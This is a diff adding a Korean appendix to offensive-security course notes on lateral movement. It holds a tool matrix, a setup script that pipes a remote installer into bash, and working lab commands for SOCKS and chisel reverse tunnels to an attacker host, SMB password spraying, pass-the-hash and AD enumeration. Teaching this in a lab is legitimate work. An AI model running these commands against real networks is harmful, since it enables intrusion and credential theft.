@@ -465,3 +465,85 @@ w03 정찰 record (208 events, 30 host, 54 port) 가 **모두 block**. 그러나
 3. DoH 사용 endpoint (`https://1.1.1.1/dns-query`) 접근 시 firewall log 의 dst_port = 443 만 보임 → DPI 도구 필요
 
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 10 측면 이동)
+
+| 기법 | lab step | 본문 도구 | OSS 도구 옵션 (강조) | 비고 |
+|------|----------|----------|---------------------|------|
+| SSH 피봇 | s1 | `ssh -L / -D` | OpenSSH / sshuttle / autossh | sshuttle = VPN 처럼 |
+| 포트 포워딩 | s2 | `ssh -L 1234:target:80` | ssh / socat / chisel / iptables | chisel 권장 (HTTP tunnel) |
+| Dynamic SOCKS | s3 | `ssh -D 1080` | ssh / proxychains / chisel | proxychains-ng 사용 |
+| chisel HTTP tunnel | s4 | `chisel server/client` | chisel / ngrok / cloudflared | NAT 우회 |
+| ProxyChains | s5 | `proxychains nmap` | proxychains-ng / proxychains4 | DNS 통한 leak 주의 |
+| Pivoting (다중 hop) | s6 | `ssh jump1 -t ssh jump2` | ssh ProxyJump / sshuttle / chisel | -J 옵션 표준 |
+| WMI/PsExec (Win) | s7 | `impacket-psexec` | impacket / wmiexec / smbexec / crackmapexec | crackmapexec 통합 |
+| RDP/VNC | s8 | `xfreerdp / vncviewer` | xfreerdp / rdesktop / remmina | xfreerdp modern |
+| SMB share | s9 | `smbclient` | smbclient / impacket-smbserver / smbmap | smbmap = audit |
+| Kerberos (AD) | s10 | `kinit / kerberoasting` | impacket-GetUserSPNs / Rubeus / kerbrute | 5주차 연결 |
+| Lateral via cred | s11 | `crackmapexec / netexec` | netexec (CME 후속) / impacket / evil-winrm | netexec 권장 |
+| Container 탈출 | s12 | `docker exec / nsenter` | deepce / amicontained / cdk-team/CDK | CDK = container privesc |
+| Tunnel 결과 검증 | s13 | `nmap proxychains` | nmap / curl --proxy / proxychains | |
+| 보고 | s15 | text | bloodhound (path 시각화) / | AD path mapping |
+
+### 학생 환경 준비 (한 번만 실행)
+
+```bash
+ssh ccc@192.168.0.112
+
+sudo apt update && sudo apt install -y \
+  proxychains4 sshpass sshuttle autossh \
+  socat \
+  smbclient impacket-scripts \
+  xfreerdp2-x11 remmina \
+  curl
+
+# chisel — HTTP tunnel (Go)
+mkdir -p ~/.local/bin
+curl -sL https://i.jpillora.com/chisel | bash 2>/dev/null || \
+  go install github.com/jpillora/chisel@latest
+
+# netexec (CME 후속, AD lateral)
+pipx install git+https://github.com/Pennyw0rth/NetExec
+# 또는: pip3 install netexec
+
+# evil-winrm (Win 인증 사용 lateral)
+sudo gem install evil-winrm 2>/dev/null
+
+# proxychains 설정
+sudo tee /etc/proxychains4.conf > /dev/null << 'PXEOF'
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+PXEOF
+```
+
+### 핵심 시나리오
+
+```bash
+# 1) SSH dynamic SOCKS — 가장 단순한 pivot
+ssh -D 1080 ccc@10.20.30.80          # attacker → web 으로 SOCKS proxy
+proxychains4 nmap -sT -Pn 10.20.30.100   # 이제 web 입장에서 siem 스캔
+
+# 2) chisel — NAT 뒤 호스트도 tunnel
+# 공격자 (외부): chisel server -p 8000 --reverse
+# 내부 호스트:  chisel client attacker:8000 R:1080:socks
+proxychains4 curl http://10.20.30.100/api      # 내부 → 외부 attacker
+
+# 3) sshuttle — VPN 처럼 (root 필요)
+sudo sshuttle -r ccc@10.20.30.80 10.20.30.0/24    # 모든 트래픽 자동 터널
+
+# 4) ssh ProxyJump (다중 hop)
+ssh -J ccc@10.20.30.80 ccc@10.20.30.100
+
+# 5) 자격증명 이용한 Lateral — netexec
+nxc smb 10.20.30.0/24 -u admin -p Pa$$w0rd        # SMB 인증 spray
+nxc winrm 10.20.30.100 -u admin -H <NTLM_HASH>     # PtH
+
+# 6) BloodHound 데이터 수집 (AD)
+bloodhound-python -d corp.local -u admin -p Pa$$w0rd -ns 10.20.30.100 -c All
+```
+
+학생은 본 10주차에서 **5종 pivot 기법** (SSH-L/D, chisel, sshuttle, ProxyJump, proxychains) + **자격증명 기반 lateral** (netexec, evil-winrm, impacket) 을 모두 익힌다.
